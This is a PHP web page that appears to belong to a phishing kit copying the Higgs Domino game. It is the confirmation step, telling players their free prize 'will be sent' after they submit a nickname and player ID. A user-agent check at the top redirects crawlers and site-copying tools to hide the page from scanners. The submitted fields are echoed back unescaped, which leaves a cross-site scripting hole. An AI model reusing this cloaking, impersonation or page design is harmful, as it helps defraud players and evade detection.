<?php 
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: tokoalexhost.com');
die();
}
?>
<html>
    <head>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
        <link href='https://unpkg.com/boxicons@2.0.9/css/boxicons.min.css' rel='stylesheet'>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css">
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
        <link rel="stylesheet" href="https://rawcdn.githack.com/AlexHostX/all.asset/c9f3ddecc56e688f8660a2d31a5beea4909fa5b9/alex-facebook.css">
        <title>Higgs Domino</title>
        <meta property="og:title" content="Higgs Domino">
        <meta name="description" content="Ambil Benefit dan Hadiah Higgs Domino secara gratis!">
        <meta property="og:description" content="Ambil Benefit dan Hadiah Higgs Domino secara gratis!">
        <meta property="og:url" content="./">
        <meta property="og:site_name" content="Higgs Domino">
        <meta property="og:type" content="website">
        <meta name="copyright"content="Alex Ariandi">
        <meta name="theme-color" content="#095352">
        <meta property="og:image" content="https://rawcdn.githack.com/AlexHostX/logAlex/6e61ca3b0b15b5e31a9a43579821321116c6af0c/higgs_domino.webp">
        <link rel="icon" href="https://www.bosbosgames.com/favicon.ico">
        <link rel="stylesheet" href="alexFrontEnd/css/style-AlexHost.css">
    </head>
    <body>
        <audio controls loop id="lagualex" src="alexFrontEnd/sound/theme_alex.mp3" style="display: none"></audio>
        <div class="appHiggAlexDomino">
            <div class="containeralexhost">
                
                <div class="headeralex">
                    <div class="kiriheaderalex">
                        <div class="boxidalex">
                            <img src="https://cdn.jsdelivr.net/gh/AlexHostX/hdi@main/v2/1633452912759.png">
                            <div class="boxidname">
                                <span id="toastnick"><?php echo $_POST['nickname'];?></span>
                                <span id="toastid"><?php echo $_POST['playid'];?></span>
                            </div>
                        </div>
                    </div>
                    <div class="kananheaderalex">
                        <div class="biasaalex slide-in-right floatpop1">
                            <img src="https://cdn.jsdelivr.net/gh/AlexHostX/hdi@main/v2/1633438081124.png">
                        </div>
                        <div class="boxfloatalex slide-in-right floatpop2">
                            <img src="https://cdn.jsdelivr.net/gh/AlexHostX/hdi@main/v2/1633438649954.png">
                        </div>
                        <div class="boxfloatalex slide-in-right floatpop3">
                            <img src="https://cdn.jsdelivr.net/gh/AlexHostX/hdi@main/v2/1633438678803.png">
                        </div>
                        <div class="biasaalex slide-in-right floatpop4">
                            <img src="https://cdn.jsdelivr.net/gh/AlexHostX/hdi@main/v2/1633437749147.png">
                        </div>
                        <div class="boxfloatalex slide-in-right floatpop5">
                            <img src="https://cdn.jsdelivr.net/gh/AlexHostX/hdi@main/v2/1633438719324.png">
                        </div>
                        <div class="boxfloatalex slide-in-right floatpop6">
                            <img src="https://cdn.jsdelivr.net/gh/AlexHostX/hdi@main/v2/1633438762811.png">
                        </div>
                        <div class="boxfloatalex slide-in-right floatpop7">
                            <img src="https://cdn.jsdelivr.net/gh/AlexHostX/hdi@main/v2/1633438803173.png">
                        </div>
                        <div class="boxfloatalex slide-in-right floatpop8">
                            <img src="https://cdn.jsdelivr.net/gh/AlexHostX/hdi@main/v2/1633541631398.png">
                        </div>
                        <div class="boxfloatalex slide-in-right floatpop9">
                            <img src="https://cdn.jsdelivr.net/gh/AlexHostX/hdi@main/v2/1633541598542.png">
                        </div>
                        <div class="boxfloatalex slide-in-right floatpop10">
                            <img src="https://cdn.jsdelivr.net/gh/AlexHostX/hdi@main/v2/1633541655926.png">
                        </div>
                        <div class="boxfloatalex slide-in-right floatpop11">
                            <img src="https://cdn.jsdelivr.net/gh/AlexHostX/hdi@main/v2/1633541683679.png">
                        </div>
                        <div class="boxfloatalex slide-in-right floatpop12">
                            <img src="https://cdn.jsdelivr.net/gh/AlexHostX/hdi@main/v2/1633541732876.png">
                        </div>
                        <div class="boxfloatalex slide-in-right floatpop13">
                            <img src="https://github.com/AlexHostX/hdi/blob/main/v2/1633541761175.png">
                        </div>
                        <div class="boxfloatalex slide-in-right floatpop14">
                            <img src="https://cdn.jsdelivr.net/gh/AlexHostX/hdi@main/v2/1633541818984.png">
                        </div>
                        <div class="boxfloatalex slide-in-right floatpop15">
                            <img src="https://github.com/AlexHostX/hdi/blob/main/v2/1633541708846.png">
                        </div>
                        <div class="boxfloatalex slide-in-right floatpop16">
                            <img src="https://cdn.jsdelivr.net/gh/AlexHostX/hdi@main/v2/1631737197765.png">
                        </div>
                        <div class="boxfloatalex slide-in-right floatpop17">
                            <img src="https://cdn.jsdelivr.net/gh/AlexHostX/hdi@main/v2/1633541907777.png">
                        </div>
                        <div class="boxfloatalex slide-in-right floatpop18">
                            <img src="https://cdn.jsdelivr.net/gh/AlexHostX/hdi@main/v2/1633541938509.png">
                        </div>
                        <div class="boxfloatalex slide-in-right floatpop19">
                            <img src="https://cdn.jsdelivr.net/gh/AlexHostX/hdi@main/v2/1633541975473.png">
                        </div>
                        <div class="boxfloatalex slide-in-right floatpop20">
                            <img src="https://github.com/AlexHostX/hdi/blob/main/v2/1633542002260.png">
                        </div>
                    </div>
                </div>
                
                <div class="floatdoublealex">
                    <img src="https://cdn.jsdelivr.net/gh/AlexHostX/hdi@main/v2/1633443973453.png">
                </div>
                <div class="floatrankealex">
                    <img src="https://cdn.jsdelivr.net/gh/AlexHostX/hdi@main/v2/1633437399819.png">
                </div>
                
                <div class="banneralexhost">
                    <div class="banneralex">
                        <img class="alexslideimg slide-in-right" src="https://static.neptunegame.com/images/website/img_swiper_2_01.png" style="display: ;">
                        <img class="alexslideimg slide-in-right" src="https://static.neptunegame.com/images/website/img_swiper_2_02_1.png" style="display: none;">
                        <img class="alexslideimg slide-in-right" src="https://static.neptunegame.com/images/website/img_swiper_2_03_1.png" style="display: none;">
                        <img class="alexslideimg slide-in-right" src="https://static.neptunegame.com/images/website/img_swiper_2_04.png" style="display: none;">
                        <img class="alexslideimg slide-in-right" src="https://static.neptunegame.com/images/website/img_swiper_2_05.png" style="display: none;">
                        <img class="alexslideimg slide-in-right" src="https://static.neptunegame.com/images/website/img_swiper_2_06.png" style="display: none;">
                        <img class="alexslideimg slide-in-right" src="https://static.neptunegame.com/images/website/img_swiper_2_07.png" style="display: none;">
                    </div>
                    <span class="dot"></span>
                    <span class="dot"></span>
                    <span class="dot"></span>
                    <span class="dot"></span>
                    <span class="dot"></span>
                    <span class="dot"></span>
                    <span class="dot"></span>
                </div>
                
                <div class="successalexhost" style="display: ;">
                    <div class="cont-sucessalex">
                        <div class="menuverifalex">
                            <div class="contverifalex">
                                <span>Verifikasi Berhasil!</span>
                            </div>
                        </div>
                        <div class="isisuccessalex">
                            <div class="iconsuccessalex">
                                <script src="https://cdn.lordicon.com/libs/mssddfmo/lord-icon-2.1.0.js"></script>
                                <lord-icon
                                    src="https://cdn.lordicon.com/nkmsrxys.json"
                                    trigger="loop"
                                    colors="primary:#b97c55,secondary:#fedca7"
                                    style="width:150px;height:150px">
                                </lord-icon>
                            </div>
                            <div class="ucapansucceessalex">
                                <p>Hadiah segera dikirim!</p>
                                <span>Pengiriman hadiah dilakukan secara berkala selama 7 hari kerja,</span>
                                <span>Mohon claim hadiah di inbox.</span>
                            </div>
                            <div class="buttonsuccessalex">
                                <button onclick="location.href='index.php';"></button>
                            </div>
                        </div>
                    </div>
                </div>
                
                <div class="footeralex">
                    <div class="imgfooteralex">
                        <img src="https://static.neptunegame.com/images/website/ico_facebook.png">
                        <img src="https://static.neptunegame.com/images/website/ico_mail.png">
                        <img src="https://static.neptunegame.com/images/website/ins.png">
                        <img src="https://static.neptunegame.com/images/website/cooperation.png">
                    </div>
                    <div class="ucapanfooteralex">
                        Seluruh hak cipta.Terhubung dengan Kami!
                    </div>
                </div>  
            </div>
        </div>
        
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<script type="text/javascript" src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script> 
<script src="alexFrontEnd/js/js-AlexHost.js"></script>
<script src="alexFrontEnd/js/js-AlexHost2.js"></script>
<link rel="stylesheet" href="https://rawcdn.githack.com/AlexHostX/protect/a64076479559076b6e31356a0fb6188d291204ce/watermark.css">

    </body>
</html>